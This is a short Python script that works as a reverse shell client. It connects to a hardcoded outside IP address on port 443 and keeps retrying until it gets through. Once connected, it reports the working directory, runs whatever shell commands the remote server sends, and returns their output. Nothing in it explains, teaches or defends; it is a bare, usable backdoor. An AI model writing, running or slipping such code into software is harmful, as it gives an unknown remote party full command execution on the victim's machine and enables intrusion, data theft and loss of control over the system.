import os
import socket
import subprocess


# Create a socket


def socket_create():
    try:
        global host
        global port
        global s
        port = 443
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Connect to a remote socket
def socket_connect():
    global host
    global port
    global s
    connected = False
    while not connected:
        try:
            s.connect(("73.179.17.248", port))
            connected = True
        except Exception as e:
            pass
    wdir = str(os.getcwd())
    s.send(str.encode(wdir))


# Receive commands from remote server and run on local machine
def receive_commands():
    global s
    while True:
        try:
            data = s.recv(1024)
            if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8"))
            if len(data) > 0:
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                   stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8")
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)
        except socket.error:
            main()


def main():
    socket_create()
    socket_connect()
    receive_commands()


main()
